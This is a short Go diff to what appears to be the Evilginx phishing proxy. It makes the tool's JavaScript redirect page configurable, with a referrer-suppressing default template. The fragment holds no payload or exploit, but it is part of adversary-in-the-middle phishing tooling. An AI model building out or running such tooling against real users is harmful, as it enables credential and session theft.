@@ -51,6 +51,7 @@ const (
 
 const (
 	HOME_DIR = ".evilginx"
+	DEFAULT_REDIRECT_CODE = "<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>"
 )
 
 const (
@@ -1313,7 +1314,11 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	body := fmt.Sprintf("<html><head><meta name='referrer' content='no-referrer'><script>top.location.href='%s';</script></head><body></body></html>", rurl)
+	redir := p.cfg.GetCustomRedir()
+	if redir == "" {
+		redir = DEFAULT_REDIRECT_CODE
+	}
+	body := fmt.Sprintf(redir, rurl)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
 		return req, resp
